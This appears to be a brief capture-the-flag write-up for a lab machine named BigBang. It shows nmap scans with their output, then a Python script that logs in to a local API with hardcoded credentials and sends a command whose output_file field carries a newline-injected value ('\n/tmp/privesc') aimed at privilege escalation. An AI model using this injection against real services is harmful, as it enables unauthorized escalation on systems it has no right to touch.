---
date: 2025-01-31T00:00:34-06:00
# description: ""
# image: ""
lastmod: 2025-01-31
showTableOfContents: false
tags: ["Python", "Hacking"]
categories: ["Writeups"]
title: "Mon Premier Post"
showTableOfContents: true
type: "post"
---

# Bonjour mon nom est

## Balayage

```
nmap --open 10.129.204.8
```


```
nmap -sC -sV -Pn -oA nmap/BigBang 10.129.204.8
```

**Resultats**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-25 14:43 CST
Nmap scan report for 10.129.204.8
Host is up (0.071s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 d4:15:77:1e:82:2b:2f:f1:cc:96:c6:28:c1:86:6b:3f (ECDSA)
|_  256 6c:42:60:7b:ba:ba:67:24:0f:0c:ac:5d:be:92:0c:66 (ED25519)

80/tcp open  http    Apache httpd 2.4.62
|_http-title: Did not follow redirect to http://blog.bigbang.htb/
|_http-server-header: Apache/2.4.62 (Debian)
Service Info: Host: blog.bigbang.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.71 seconds
```

Run this python script

```python
import requests
import json

# Login to the server and retrieve the access token
login_response = requests.post(
    "http://127.0.0.1:9090/login",
    json={
        "username": "developer",
        "password": "bigbang"
    }
)

# Extract the access token from the login response
token = login_response.json().get("access_token")
print(f"Access Token: {token}")

# Define the payload for the command
payload = {
    "command": "send_image",
    "output_file": "\n/tmp/privesc"
}

# Set up the headers with the authorization token
headers = {
    "Authorization": f"Bearer {token}",
    "Content-Type": "application/json"
}

# Send the command to the server
response = requests.post(
    "http://127.0.0.1:9090/command",
    headers=headers,
    json=payload
)

# Print the response from the server
print(f"Response: {response.text}")
```
